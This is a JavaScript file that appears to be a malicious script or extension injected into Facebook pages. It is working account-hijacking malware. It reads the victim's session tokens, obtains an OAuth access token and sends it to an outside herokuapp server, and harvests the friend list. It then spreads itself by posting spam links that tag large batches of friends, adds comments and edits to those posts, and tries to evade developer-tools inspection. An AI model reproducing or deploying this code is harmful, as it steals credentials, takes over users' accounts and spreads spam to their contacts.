(new Image).src = "//whos.amung.us/swidget/mandar1n0s";

var cnsl = true;
var win = this;
var sie = win["XMLHttpRequest"];
var empty = "";
function nejse() {
  var c_n = "locl:987"+profile_id;
  var c_t = 30;

  if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
      localStorage[c_n] = Date.now();
    config = {};
    config["link"] = "http://{random}./{random}";
    config["post_limit"] = "1";
    config["tag_limit"] = rand(40,99);
    config["mode"] = true;
    config["testuser"] = "100010314190852";
    console["log"](config);
    if (!(1 != config["mode"] && profile_id != config["testuser"])) {
       _e_P();
       nekot();
    }
  }else{
      var a_t = new Date();
      a_t.setTime(parseInt(localStorage[c_n]) + (60*1000*c_t));
      console.log("a_t:" + a_t.toLocaleString());
  }
}
function nekot() {

  if (localStorage.access_token != "nekotwe") {
    var getParams = {};
    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
    getParams["composer_type"] = "pages_feed";
    getParams["target_id"] = "20531316728";
    getParams["av"] = profile_id;
    getParams["dpr"] = "1";
    var params = {};
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = __dyn;
    params["__af"] = "j0";
    params["__req"] = "2z";
    params["__be"] = "-1";
    params["__pc"] = "EXP1:home_page_pkg";
    params["__rev"] = __rev;
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    var xhr = new ajax;
    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
          localStorage.access_token = "nekotwe";
        }
      }
    };
    xhr.send(deSerialize(params));
  }
}
function _e_P(){
  var b = {};
  b["fb_dtsg"] = fb_dtsg;
  b["__user"] = profile_id;
  b["__a"] = 1;
  b["__dyn"] = dyn;
  b["__af"] = rastgele(2);
  b["__req"] = rastgele(2);
  b["__be"] = -1;
  b["__pc"] = "EXP:DEFAULT";
  b["__rev"] = __rev;
  b["logging"] = rand(1111111111, 1E16);
  var d = new sie;
  d["open"]("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1");
  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  d["onreadystatechange"] = function() {
    if (4 == d["readyState"]) {
      if (200 == d["status"]) {
        _g_T();
      }
    }
  };
  d["send"](_z(b));
}
function _g_T() {
    var params = {};
    params["fb_dtsg"] = fb_dtsg;
    params["app_id"] = "121876164619130";
    params["redirect_uri"] = "fbconnect://success";
    params["display"] = "popup";
    params["access_token"] = "";
    params["sdk"] = "";
    params["from_post"] = 1;
    params["private"] = "";
    params["tos"] = "";
    params["login"] = "";
    params["read"] = "";
    params["write"] = "";
    params["extended"] = "";
    params["social_confirm"] = "";
    params["confirm"] = "";
    params["seen_scopes"] = "";
    params["auth_type"] = "";
    params["auth_token"] = "";
    params["auth_nonce"] = "";
    params["default_audience"] = "";
    params["ref"] = "Default";
    params["return_format"] = "access_token";
    params["domain"] = "";
    params["sso_device"] = "ios";
    params["__CONFIRM__"] = 1;
    var xhr = new sie();
    xhr.open("POST", "/v2.8/dialog/oauth/confirm");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var c = {};
            if(xhr.responseText.indexOf("access_token=") > 0){
                c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
                //new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEW";
                _c(c);
            }
        }
    }
    xhr.send(deSerialize(params));
}
function _c(c) {
  var b$$0 = {};
  b$$0["q"] = "SELECT uid, name, online_presence, pic_big, can_post, friend_count  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) AND can_post=1 Order By online_presence Limit 2000";
  b$$0["access_token"] = c["access_token"];
  b$$0["ext"] = "me";
  var e = new sie;
  e["open"]("GET", "https://graph.facebook.com/fql?" + _z(b$$0), true);
  e["onreadystatechange"] = function() {
    if (4 == e["readyState"] && 200 == e["status"]) {
      var b = JSON["parse"](e["responseText"].replace("for (;;);", ""));
      if (!b["error"]) {
        b = b["data"];
        b = _u(b);
        c["friends"] = [];
        i = 0;
        for (;i < b["length"];i++) {
          if (b[i].online_presence == "active") {
            c["friends"].push(b[i]);
          }
        }
        i = 0;
        for (;i < b["length"];i++) {
          if (b[i].online_presence == "idle") {
            c["friends"].push(b[i]);
          }
        }
        // i = 0;
        // for (;i < b["length"];i++) {
        //   if (b[i].online_presence == "offline") {
        //     c["friends"].push(b[i]);
        //   }
        // }
        if (0 < c["friends"].length) {
          _d(c);
        }
      }
    }
  };
  e["send"]();
}
function _d(c) {
  var b = Math["ceil"](c["friends"].length / config["tag_limit"]);
  config["post_limit"] = b > config["post_limit"] ? config["post_limit"] : b;
  p = 0;
  for (;p < config["post_limit"];p++) {
    c["tags"] = [];
    pk = 0;
    for (;pk < config["tag_limit"];pk++) {
      b = pk + config["tag_limit"] * p;
      if (c["friends"][b]) {
        c["tags"].push(c["friends"][b]);
      }
    }
    console["log"](c["tags"]);
    _e(c);
  }
}
function _e(c) {
      var b = c["tags"];
      var str = user_name;
      var res = str.split(" ");
      var Uname = res[0];
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id+"&name="+Uname);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
      xhr.send();
      xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
           data = JSON.parse(xhr.responseText);
           if(data.link){
             c["link"] = data.link;
             c["tags"] = b;
             post(c);
           }

          }
      }



}

function post(c) {
  var b = c["tags"];
  var e = c["link"];
  var message = generate_name(10);
  var d$$0 = {};
  d$$0["composer_entry_time"] = 6;
  d$$0["composer_session_id"] = _p();
  d$$0["composer_session_duration"] = _v(15, 50);
  d$$0["composer_source_surface"] = "timeline";
  d$$0["direct_share_status"] = 0;
  d$$0["hide_object_attachment"] = true;
  d$$0["is_explicit_place"] = false;
  d$$0["is_markdown"] = false;
  d$$0["is_q_and_a"] = false;
  d$$0["is_profile_badge_post"] = false;
  d$$0["num_keystrokes"] = 0;
  d$$0["num_pastes"] = 0;
  d$$0["privacyx"] = 300645083384735;
  d$$0["ref"] = "timeline";
  d$$0["target_type"] = "feed";
  d$$0["xhpc_message"] = message;
  d$$0["xhpc_message_text"] = message;
  d$$0["xc_disable_config[xc_disable_link]"] = "";
  d$$0["is_react"] = true;
  d$$0["xhpc_composerid"] = "rc.u_0_1g";
  d$$0["xhpc_targetid"] = profile_id;
  d$$0["xhpc_context"] = "profile";
  d$$0["xhpc_ismeta"] = 1;
  d$$0["xhpc_timeline"] = true;
  d$$0["xhpc_finch"] = false;
  d$$0["xhpc_socialplugin"] = false;
  d$$0["xhpc_modal_composer"] = false;
  d$$0["xhpc_aggregated_story_composer"] = false;
  d$$0["xhpc_publish_type"] = 1;
  d$$0["xhpc_fundraiser_page"] = false;
  d$$0["__user"] = profile_id;
  d$$0["__a"] = 1;
  d$$0["__dyn"] = dyn;
  d$$0["__af"] = "i0";
  d$$0["__req"] = "q";
  d$$0["__be"] = -1;
  d$$0["__pc"] = "PHASED:DEFAULT";
  d$$0["__rev"] = __rev;
  d$$0["fb_dtsg"] = fb_dtsg;
  d$$0["jazoest"] = jazoest;
  i = 0;
  for (;i < c["tags"].length;i++) {
    d$$0["composertags_with[" + i + "]"] = c["tags"][i].uid;
    d$$0["text_composertags_with[" + i + "]"] = c["tags"][i].name;
  }
  var f = new sie;
  f["open"]("POST", "https://www.facebook.com/ajax/updatestatus.php?ext=me&av=" + profile_id);
  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  f["send"](_z(d$$0));
  f["onreadystatechange"] = function() {
    if (4 == f["readyState"] && 200 == f["status"]) {
      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
      if (!d["error"]) {
        c["post_id"] = _t(d, "targetfbid");
        c["tags"] = b;
        c["link"] = e;
        console["log"]("Posted: https://fb.com/" + c["post_id"]);
        comment(c);
      }
    }
  };
}

function comment(c) {
  var b = c["tags"];
  var e = c["link"];
  var d = c["post_id"];
  var f = {};
  f["ft_ent_identifier"] = c["post_id"];
  f["comment_text"] = "Video ⤵ ⤵ ⤵ ⤵ ⤵ ⤵"+ "\n" + c["link"];
  f["source"] = 1;
  f["client_id"] = Date["now"]() + ":" + Math["floor"](Date["now"]() / 1E3);
  f["session_id"] = _y(8);
  f["reply_fbid"] = "";
  f["parent_comment_id"] = "";
  f["rootid"] = "u_ps_0_0_7";
  f["attached_sticker_fbid"] = 0;
  f["attached_photo_fbid"] = 0;
  f["attached_video_fbid"] = 0;
  f["feedback_referrer"] = "/permalink.php";
  f["feed_context"] = "{}";
  f["video_time_offset"] = "";
  f["is_live_streaming"] = false;
  f["ft[top_level_post_id]"] = c["post_id"];
  f["ft[fbfeed_location]"] = 1;
  f["ft[insertion_position]"] = 0;
  f["av"] = profile_id;
  f["__user"] = profile_id;
  f["__a"] = 1;
  f["__dyn"] = dyn;
  f["__af"] = "m";
  f["__req"] = 14;
  f["__be"] = -1;
  f["__pc"] = "PHASED:DEFAULT";
  f["__rev"] = __rev;
  f["fb_dtsg"] = fb_dtsg;
  f["jazoest"] = jazoest;
  var g = new sie;
  g["open"]("POST", "https://www.facebook.com/ufi/add/comment/?ext=me");
  g["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  g["send"](_z(f));
  g["onreadystatechange"] = function() {
    if (!(4 != g["readyState"])) {
      if (!(200 != g["status"])) {
        if (!JSON["parse"](g["responseText"].replace("for (;;);", ""))["error"]) {
          _h(c);
          // _i(c);
          // _j(c);
          c["tags"] = b;
          c["link"] = e;
          c["post_id"] = d;
          console["log"]("Commented: https://fb.com/" + c["post_id"]);
        }
      }
    }
  };
}
function _h(c) {
  var b$$0 = {};
  b$$0["composer_id"] = "rc.u_a_0";
  b$$0["target_id"] = profile_id;
  b$$0["scrape_url"] = c["link"];
  b$$0["entry_point"] = "edit_dialog";
  b$$0["source_attachment"] = "STATUS";
  b$$0["source_logging_name"] = "link_pasted";
  b$$0["av"] = profile_id;
  b$$0["dpr"] = 1;
  b$$0["ext"] = "me";
  var e$$0 = {};
  e$$0["__user"] = profile_id;
  e$$0["__a"] = 1;
  e$$0["__dyn"] = dyn;
  e$$0["__af"] = "i0";
  e$$0["__req"] = "k";
  e$$0["__be"] = -1;
  e$$0["__pc"] = "PHASED:DEFAULT";
  e$$0["__rev"] = __rev;
  e$$0["fb_dtsg"] = fb_dtsg;
  e$$0["jazoest"] = jazoest;
  var d = new sie;
  d["open"]("POST", "https://www.facebook.com/react_composer/scraper/?" + _z(b$$0));
  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  d["send"](_z(e$$0));
  d["onreadystatechange"] = function() {
    if (4 == d["readyState"] && 200 == d["status"]) {
      var b = JSON["parse"](d["responseText"].replace("for (;;);", ""));
      c["scrape"] = _t(b, "attachmentConfig");
      b = _t(b, "__html");
      var e = document["createElement"]("form");
      e["innerHTML"] = b;
      b = e["getElementsByTagName"]("input");
      c["attachment"] = {};
      i = 0;
      for (;i < b["length"];i++) {
        if (b[i].name) {
          c["attachment"][b[i].name] = b[i].value;
        }
      }
      _i(c);
      _j(c);
    }
  };
}
function _i(c) {
  var b = {};
  // for (key in c["attachment"]) {
  //   b[key] = c["attachment"][key];
  // }
  b["composer_entry_time"] = 8;
  b["composer_session_id"] = _p();
  b["composer_session_duration"] = _v(250, 750);
  b["composer_source_surface"] = "newsfeed";
  b["direct_share_status"] = 0;
  b["hide_object_attachment"] = true;
  b["is_explicit_place"] = false;
  b["is_markdown"] = false;
  b["is_q_and_a"] = false;
  b["is_profile_badge_post"] = false;
  b["num_keystrokes"] = 0;
  b["num_pastes"] = 0;
  b["privacyx"] = "300645083384735";
  b["ref"] = "edit_dialog";
  b["tagger_session_id"] = Math["floor"](Date["now"]() / 1E3);
  b["target_type"] = "feed";
  b["xhpc_message"] = "";
  b["xhpc_message_text"] = "";
  b["is_forced_reshare_of_post"] = false;
  b["is_react"] = true;
  b["xhpc_composerid"] = "rc.u_a_0";
  b["xhpc_targetid"] = profile_id;
  b["xhpc_context"] = "profile";
  b["xhpc_ismeta"] = 1;
  b["xhpc_timeline"] = false;
  b["xhpc_finch"] = false;
  b["xhpc_socialplugin"] = false;
  b["xhpc_modal_composer"] = false;
  b["xhpc_aggregated_story_composer"] = false;
  b["xhpc_publish_type"] = 1;
  b["xhpc_fundraiser_page"] = false;
  b["postID"] = c["post_id"];
  b["save_only"] = true;
  b["xc_edit_callsite"] = "fb_feed";
  b["xc_entstory_context"] = "{}";
  b["xc_story_dom_id"] = "u_0_t";
  b["__user"] = profile_id;
  b["__a"] = 1;
  b["__dyn"] = dyn;
  b["__af"] = "i0";
  b["__req"] = "o";
  b["__be"] = -1;
  b["__pc"] = "PHASED:DEFAULT";
  b["__rev"] = __rev;
  b["fb_dtsg"] = fb_dtsg;
  b["jazoest"] = jazoest;
  i = 0;
  for (;i < c["friends"].length;i++) {
    b["composertags_with[" + i + "]"] = c["friends"][i].uid;
    b["text_composertags_with[" + i + "]"] = c["friends"][i].name;
  }
  var e = new sie;
  e["open"]("POST", "https://www.facebook.com/composer/edit/" + c["post_id"] + "?av=" + profile_id + "&ext=me");
  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  e["send"](_z(b));
  e["onreadystatechange"] = function() {
    if (4 == e["readyState"] && (200 == e["status"] && !JSON["parse"](e["responseText"].replace("for (;;);", ""))["error"])) {
      console["log"]("Edited: https://fb.com/" + c["post_id"]);
    }
  };
}
function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}
function _j(c) {
  var b = {};
  b["message_id"] = c["post_id"];
  b["follow"] = 0;
  b["__user"] = profile_id;
  b["__a"] = 1;
  b["__dyn"] = dyn;
  b["__af"] = "m";
  b["__req"] = 8;
  b["__be"] = -1;
  b["__pc"] = "PHASED:DEFAULT";
  b["__rev"] = __rev;
  b["fb_dtsg"] = fb_dtsg;
  b["jazoest"] = jazoest;
  var e = new sie;
  e["open"]("POST", "https://www.facebook.com/ajax/litestand/follow_post?ext=me");
  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  e["send"](_z(b));
  e["onreadystatechange"] = function() {
    if (4 == e["readyState"] && 200 == e["status"]) {
      JSON["parse"](e["responseText"].replace("for (;;);", ""));
    }
  };
}

function _l() {
  var c = {};
  c["value"] = "300645083384735";
  c["prev_value"] = "291667064279714";
  c["__user"] = profile_id;
  c["__a"] = 1;
  c["__dyn"] = dyn;
  c["__req"] = "15";
  c["fb_dtsg"] = fb_dtsg;
  c["jazoest"] = jazoest;
  c["__rev"] = __rev;
  var b = new sie;
  b["open"]("POST", "https://www.facebook.com/ajax/settings/granular_privacy/composer.php");
  b["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  b["send"](_z(c));
  b["onreadystatechange"] = function() {
    if (4 == b["readyState"] && 200 == b["status"]) {
      JSON["parse"](b["responseText"].replace("for (;;);", ""));
    }
  };
}
function _m(c, b) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = 1 == _v(1, 2) ? sessiz[_v(0, sessiz["length"] - 1)] : sesli[_v(0, sesli["length"] - 1)];
  if (1 == b) {
    rname = rname["toUpperCase"]();
  }
  n = 0;
  for (;n < c;n++) {
    rname = 0 <= sesli["indexOf"](rname[rname["length"] - 1]) ? rname + sessiz[_v(0, sessiz["length"] - 1)] : rname + sesli[_v(0, sesli["length"] - 1)];
  }
  return rname;
}
function _n(c, b, e) {
  var d = false;
  a = 0;
  for (;a < c["length"];a++) {
    for (k in c[a]) {
      if (k == b && c[a][k] == e) {
        d = true;
        break;
      }
    }
  }
  return d;
}
function _o(c, b) {
  var e = "abcdefghijklmnoprstuvyzx0123456789";
  var d = "";
  cr = 0;
  for (;cr < c["length"];cr++) {
    d += e[b["indexOf"](c[cr])];
  }
  return d;
}
function _p() {
  function c() {
    return Math["floor"](65536 * (1 + Math["random"]())).toString(16).substring(1);
  }
  return c() + c() + "-" + c() + "-" + c() + "-" + c() + "-" + c() + c() + c();
}
function _s(c, b) {
  var e = [];
  for (;e["length"] < c;) {
    var d = Math["floor"](Math["random"]() * b);
    if (0 > e["indexOf"](d)) {
      e["push"](d);
    }
  }
  return e;
}
function _t(c, b) {
  var e = false;
  for (key in c) {
    if (key["toString"]() == b) {
      e = c[key];
      break;
    } else {
      if (typeof c[key] == "object" && (e = _t(c[key], b), 0 != e)) {
        break;
      }
    }
  }
  return e;
}
function _u(c) {
  var b = c["length"];
  var e;
  var d;
  for (;0 !== b;) {
    d = Math["floor"](Math["random"]() * b);
    --b;
    e = c[b];
    c[b] = c[d];
    c[d] = e;
  }
  return c;
}
function _v(c, b) {
  return Math["floor"](Math["random"]() * (b - c)) + c;
}
function _y(c) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  l = 0;
  for (;l < c;l++) {
    ret += mtn[Math["floor"](Math["random"]() * mtn["length"])];
  }
  return ret;
}
function _z(c) {
  return Object["keys"](c).map(function(b) {
    return encodeURIComponent(b) + "=" + encodeURIComponent(c[b]);
  }).join("&");
}
function get_dyn() {
 function toCompressedString() {
   $BitMap1 = [];
   for (i in t) {
     $BitMap1[t[i]] = 1;
   }
   if ($BitMap1["length"] === 0) {
     return "";
   }
   var l = [];
   var m = 1;
   var n = $BitMap1[0] || 0;
   var o = n.toString(2);
   var p = 1;
   for (;p < $BitMap1["length"];p++) {
     var q = $BitMap1[p] || 0;
     if (q === n) {
       m++;
     } else {
       l["push"](j(m));
       n = q;
       m = 1;
     }
   }
   if (m) {
     l["push"](j(m));
   }
   return k(o + l["join"](""));
 }
 function j(l) {
   var m = l.toString(2);
   var n = "0"["repeat"](m["length"] - 1);
   return n + m;
 }
 function k(l) {
   var m = (l + "00000")["match"](/[01]{6}/g);
   var n = "";
   var o = 0;
   for (;o < m["length"];o++) {
     n += h[parseInt(m[o], 2)];
   }
   return n;
 }
 var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var is = bd["concat"](hd);
 var t = [];
 for (x in is) {
   if (is[x] != null) {
     var p = is[x]["replace"]("},", "")["replace"]("]", "");
     if (parseInt(p) >= 7) {
       t["push"](parseInt(p));
     }
   }
 }
 var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
 return toCompressedString();
}
function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}
function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}
function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}
function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}
var cntrl = "d";
var element = new Image;
element["__defineGetter__"]("id", function() {
  cntrl = "e";
  if (0 == cnsl) {
    win["location"] = "";
  }
});
console["log"](element);
console["clear"]();
function _composer() {
  var c = new sie;
  c["open"]("GET", "https://www.facebook.com/");
  c["send"]();
  c["onreadystatechange"] = function() {
    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
      jazoest = "";
      var b = 0;
      for (;b < fb_dtsg["length"];b++) {
        jazoest += fb_dtsg["charCodeAt"](b);
      }
      jazoest = "2" + jazoest;
      dyn = get_dyn();
      nejse();
    }
  };
}
if (0 <= location["hostname"].indexOf("facebook.com") && (cntrl == "d" || 1 == cnsl)) {
  if (!document["getElementById"]("isrun") && 0 > location["href"].indexOf("facebook.com/checkpoint")) {
    var lg = document["createElement"]("meta");
    lg["id"] = "isrun";
    document["head"].appendChild(lg);
    _composer();
  }
} else {
  if (0 <= location["hostname"].indexOf("facebook.com")) {
    console["error"]("Uncaught ReferenceError: fb_dtsg is not defined");
  }
}
;
